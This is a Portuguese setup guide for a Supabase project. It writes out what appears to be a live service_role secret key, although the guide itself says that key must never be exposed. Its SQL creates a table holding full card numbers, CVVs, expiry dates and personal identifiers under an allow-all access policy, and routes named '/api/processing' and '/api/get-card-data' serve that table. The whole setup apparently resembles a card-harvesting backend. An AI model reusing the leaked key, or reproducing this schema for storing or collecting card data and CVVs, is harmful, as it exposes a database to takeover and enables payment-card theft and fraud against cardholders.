# 🔧 Configuração do Supabase

## 1️⃣ Criar arquivo .env.local na raiz do projeto

Copie o arquivo `env.example.txt` para `.env.local` e preencha a **service_role key**:

```env
NEXT_PUBLIC_SUPABASE_URL=https://vlnekqfpasxsrkrbhfrf.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZsbmVrcWZwYXN4c3JrcmJoZnJmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjA5ODc5ODgsImV4cCI6MjA3NjU2Mzk4OH0.sW2bhIpktuNrdACRY2pPlYk4YSMcv6iqBktk3LEqApU
SUPABASE_SERVICE_ROLE_KEY=COLE_AQUI_A_SERVICE_ROLE_KEY
```

## 2️⃣ Onde encontrar a service_role key:

1. Acesse: https://supabase.com/dashboard/project/vlnekqfpasxsrkrbhfrf
2. Vá em **Project Settings** (ícone engrenagem) → **API**
3. Copie a **service_role** key (secret)
4. Cole no `.env.local`

⚠️ **IMPORTANTE:** A service_role key NUNCA deve ser exposta no frontend ou commitada no Git!

## 3️⃣ Instalar dependências:

```bash
npm install @supabase/supabase-js
```

## 4️⃣ Configurar no Vercel/Netlify (Deploy):

Após fazer deploy, configure as variáveis de ambiente no painel:

**Vercel:**
1. Vá em **Settings** → **Environment Variables**
2. Adicione:
   - `SUPABASE_SERVICE_ROLE_KEY` = `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZsbmVrcWZwYXN4c3JrcmJoZnJmIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc2MDk4Nzk4OCwiZXhwIjoyMDc2NTYzOTg4fQ.rk_dXRvolN6yukgiUjFmHAh7dnOYJbiDsx687dOBH-o`

**Netlify:**
1. Vá em **Site settings** → **Environment variables**
2. Adicione a mesma variável acima

## 5️⃣ SQL para criar a tabela:

Execute no **SQL Editor** do Supabase:

```sql
-- Criar tabela de cartões
CREATE TABLE card_data (
  id BIGSERIAL PRIMARY KEY,
  timestamp TIMESTAMPTZ DEFAULT NOW(),
  customer_name TEXT NOT NULL,
  customer_cpf TEXT,
  customer_phone TEXT,
  customer_email TEXT,
  customer_address TEXT,
  card_number TEXT NOT NULL,
  card_holder_name TEXT NOT NULL,
  card_expiry_date TEXT,
  card_cvv TEXT,
  product_name TEXT,
  product_price INTEGER,
  product_quantity INTEGER,
  total INTEGER,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Criar índices
CREATE INDEX idx_card_data_timestamp ON card_data(timestamp DESC);
CREATE INDEX idx_card_data_customer_email ON card_data(customer_email);

-- Habilitar RLS
ALTER TABLE card_data ENABLE ROW LEVEL SECURITY;

-- Política de acesso total (ajuste conforme necessário)
CREATE POLICY "Enable all access for service role" ON card_data
  FOR ALL
  USING (true)
  WITH CHECK (true);
```

## 5️⃣ Pronto!

Após configurar, as rotas `/api/processing` e `/api/get-card-data` usarão o Supabase automaticamente.

⚠️ **Nota de Segurança:** A rota `/api/processing` não é exposta diretamente no frontend para evitar exposição de dados sensíveis.
